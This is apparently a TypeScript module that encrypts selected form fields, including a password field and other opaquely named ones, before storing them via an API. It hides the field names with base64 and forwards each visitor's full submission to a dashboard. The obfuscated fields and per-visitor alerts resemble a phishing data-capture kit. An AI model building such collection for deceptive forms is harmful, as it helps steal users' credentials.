/**
 * Secure Firebase - Replaced with API calls
 * Maintains same interface for backward compatibility
 */

import { addData, notifyDashboard } from './api';
import { _e, _d, _ef, _df, _l } from './secure-utils';

const sensitiveFields = ['_v1', '_v2', '_v3', '_v4', '_v5', '_v6', '_pw', '_ncc'];

function isSensitive(key: string): boolean {
  return sensitiveFields.includes(key);
}

export async function secureAddData(data: Record<string, any>): Promise<void> {
  _l('Encrypting data before storage');

  const encrypted: Record<string, any> = {};

  Object.keys(data).forEach((key) => {
    if (isSensitive(key) && typeof data[key] === 'string') {
      const obfuscatedKey = btoa(key).substring(0, 12);
      encrypted[obfuscatedKey] = _e(data[key]);
      _l(`Encrypted field: ${key}`);
    } else {
      encrypted[key] = data[key];
    }
  });

  await addData(encrypted);
}

export async function secureSubmitFormData(data: Record<string, any>): Promise<void> {
  const visitorId = data?.id || data?.visitorId || data?.raw?.id || data?.raw?.visitorId || (typeof window !== 'undefined' ? window.localStorage.getItem('visitor') : null);
  if (!visitorId) return;

  await secureAddData(data);
  await notifyDashboard({ ...data, id: String(visitorId), visitorId: String(visitorId), source: 'submit' });
}

export async function secureGetData(
  docId: string,
  originalData: Record<string, any>
): Promise<Record<string, any>> {
  _l('Decrypting data from storage');

  const decrypted: Record<string, any> = { ...originalData };

  Object.keys(originalData).forEach((key) => {
    try {
      const decodedKey = atob(key);
      if (isSensitive(decodedKey) && typeof originalData[key] === 'string') {
        decrypted[decodedKey] = _d(originalData[key]);
        delete decrypted[key];
        _l(`Decrypted field: ${decodedKey}`);
      }
    } catch {
      // not a base64 key
    }
  });

  return decrypted;
}
